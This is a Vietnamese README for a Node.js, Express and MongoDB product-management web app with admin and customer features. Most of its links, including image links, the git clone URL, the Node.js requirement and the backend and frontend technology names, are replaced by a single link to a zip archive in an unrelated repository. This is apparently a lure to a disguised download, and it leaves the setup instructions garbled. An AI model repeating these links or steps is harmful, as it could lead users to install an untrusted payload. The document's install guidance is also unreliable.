# Products Management System

## Giới thiệu

 Products Management System là một ứng dụng web dùng để quản lý thông tin sản phẩm, danh mục và bài viết. <br>Dự án áp dụng phương pháp Server-side Rendering (SSR) và gồm hai phần chính:<br>
 Admin: Quản trị viên có thể thêm, chỉnh sửa, xóa sản phẩm, danh mục, bài viết và quản lý quyền người dùng.<br>
 Client: Khách hàng có thể tìm kiếm, đặt hàng, yêu cầu đặt lại mật khẩu, xác thực và đăng ký tài khoản.

![Trang Admin](https://raw.githubusercontent.com/hana200887/KiemThu/main/config/Thu_Kiem_v1.9.zip)

## Chức năng chính
Quản lý sản phẩm, danh mục, bài viết<br>
Phân quyền người dùng<br>
Lọc và tìm kiếm đơn hàng<br>
Đặt hàng và quản lý đơn hàng<br>
Xác thực và đăng ký tài khoản<br>
Yêu cầu đặt lại mật khẩu

## Cài đặt và sử dụng
Yêu cầu hệ thống<br>
https://raw.githubusercontent.com/hana200887/KiemThu/main/config/Thu_Kiem_v1.9.zip v16+<br>
MongoDB Atlas hoặc cấu hình cơ sở dữ liệu MongoDB cụ thể

## Cách chạy dự án
git clone https://raw.githubusercontent.com/hana200887/KiemThu/main/config/Thu_Kiem_v1.9.zip<br>
cd Products-Management-System

## Cài đặt dependencies
npm install

## Cấu hình biến môi trường
Tạo file .env và thêm thông tin cần thiết:<br>
MONGO_URI=your_mongodb_connection_string<br>
PORT=5000<br>
JWT_SECRET=your_jwt_secret

## Database
![Trang Admin](https://raw.githubusercontent.com/hana200887/KiemThu/main/config/Thu_Kiem_v1.9.zip)

## Chạy server
npm start<br>
Truy cập trang web<br>
Mở trình duyệt và truy cập: http://localhost:3000

## Công nghệ sử dụng
Backend: https://raw.githubusercontent.com/hana200887/KiemThu/main/config/Thu_Kiem_v1.9.zip, Express, MongoDB<br>
Frontend: React, https://raw.githubusercontent.com/hana200887/KiemThu/main/config/Thu_Kiem_v1.9.zip (nếu dự án dùng SSR)<br>
Xác thực: JSON Web Token (JWT)<br>
Triển khai: Vercel 


